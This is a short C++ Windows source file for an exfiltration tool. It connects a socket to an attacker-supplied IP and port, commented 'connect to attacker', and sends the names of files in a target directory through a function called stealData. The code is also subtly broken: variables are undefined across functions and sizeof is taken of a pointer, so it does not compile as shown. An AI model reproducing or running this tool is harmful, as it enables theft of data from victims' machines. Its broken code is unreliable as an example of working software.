#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#pragma comment(lib, "Ws2_32.lib")

#include <iostream>
#include <WinSock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string>

using namespace std;

int stealData(char *fileName)
{
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(filePath)) != NULL)
    {
        while ((ent = readdir(dir)) != NULL)
        {
            send(Socket, ent->d_name, sizeof(ent->d_name), 0);
            send(Socket, "\n", 1, 0);
            memset(ent->d_name, 0, sizeof(ent->d_name));
        }
        closedir(dir);
        return 1;
    }
    else
    {
        perror("Can't open the file.");
        return 0;
    }
}

int main(int argc, char *args[])
{

    // Vars
    char *ip = args[1];
    int port = atoi(args[2]);
    char *filePath = args[3];

    // winsock init
    WSADATA wsaData;
    SOCKADDR_IN addr;
    WORD DLLversion = MAKEWORD(2, 1);
    if (WSAStartup(DLLversion, &wsaData) != 0)
    {
        printf("Erorr, can't continue.");
        ExitProcess(EXIT_FAILURE);
    }

    // Create Socket
    SOCKET Socket = socket(AF_INET, SOCK_STREAM, 0);
    if (Socket < 0)
    {
        printf("Erorr, can't continue.");
        ExitProcess(EXIT_FAILURE);
    }
    // Bind the socket
    addr.sin_addr.s_addr = inet_addr(ip);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // connect to attacker

    connect(Socket, (SOCKADDR *)&addr, sizeof(addr));

    // take action
    send(Socket, filePath, sizeof(filePath), 0);
    send(Socket, "\n", 1, 0);

    stealData(fileName);

    ExitProcess(EXIT_SUCCESS);
}